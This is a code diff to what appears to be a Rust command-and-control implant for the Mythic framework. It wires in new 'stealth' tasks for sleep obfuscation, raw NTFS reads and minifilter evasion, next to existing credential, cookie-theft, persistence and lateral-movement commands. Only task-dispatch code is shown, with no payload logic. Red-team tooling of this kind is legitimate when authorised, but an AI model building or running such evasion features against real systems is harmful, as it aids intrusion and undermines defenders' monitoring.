@@ -12,7 +12,7 @@ use std::sync::{
 // Import all other commands
 use crate::{
     askcreds, browser_cookies, c2manage, cat, cd, cleanup, clipboard, collection, cp, credentials, discovery, download, evasion, execute, exit, getenv, getprivs, jobs, lateral, ldap, ls, mkdir, mv, netstat, persist, portfwd, portscan, ps, pwd,
-    redirect, rm, screenshot, setenv, shell, shinject, sleep, ssh, token, unsetenv, upload, workinghours,
+    redirect, rm, screenshot, setenv, shell, shinject, sleep, ssh, stealth, token, unsetenv, upload, workinghours,
 };
 
 /// Represents a background task (job)
@@ -210,6 +210,11 @@ impl Tasker {
                             // C2 management commands
                             "c2info" => c2manage::c2info(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "killdate" => c2manage::killdate(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+
+                            // Stealth evasion commands
+                            "stealth_sleep" => stealth::stealth_sleep(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "ntfs_read" => stealth::ntfs_read(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "minifilter_evade" => stealth::minifilter_evade(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
 
                             _ => mythic_error!(
                                 task.id,
